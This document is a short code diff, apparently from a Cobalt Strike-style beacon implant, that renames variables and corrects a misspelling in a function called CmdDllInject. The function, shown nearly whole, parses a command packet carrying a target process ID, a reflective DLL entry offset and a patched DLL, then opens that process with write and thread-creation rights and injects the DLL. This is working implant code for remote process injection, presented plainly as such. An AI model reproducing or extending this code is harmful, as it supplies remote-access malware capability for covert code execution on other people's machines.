@@ -2,17 +2,17 @@
 #include "DllInject.h"
 #include "Process.h"
 
-VOID CmdDllInejct(unsigned char* commandBuf, size_t commandBuflen, BOOL x86) {
-	// 数据包格式：injectPid(4 Bytes) || offset(4 Bytes) || patchDllContent(commandBuflen - 8 Bytes)
+VOID CmdDllInject(unsigned char* command, size_t command_length, BOOL x86) {
+	// 数据包格式：injectPid(4 Bytes) || offset(4 Bytes) || patchDllContent(command_length - 8 Bytes)
 	datap parser;
-	BeaconDataParse(&parser, commandBuf, commandBuflen);
+	BeaconDataParse(&parser, command, command_length);
 
 	// 注入的 PID
 	uint32_t injectPid = (uint32_t)BeaconDataInt(&parser);
 	// Dll 执行 RDI 入口
 	uint32_t offset = (uint32_t)BeaconDataInt(&parser);
 	// patch 后的 Dll
-	unsigned char* patchDllContent = BeaconDataPtr(&parser, commandBuflen - 8);
+	unsigned char* patchDllContent = BeaconDataPtr(&parser, command_length - 8);
 
 	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, injectPid);
 	if (!hProcess) {
@@ -29,7 +29,7 @@ VOID CmdDllInejct(unsigned char* commandBuf, size_t commandBuflen, BOOL x86) {
 		return;
 	}
 
-	size_t patchDllSize = commandBuflen - 8;
+	size_t patchDllSize = command_length - 8;
 	InjectProcessLogic(NULL, hProcess, injectPid, patchDllContent, patchDllSize, offset, NULL, 0);
 
 	CloseHandle(hProcess);
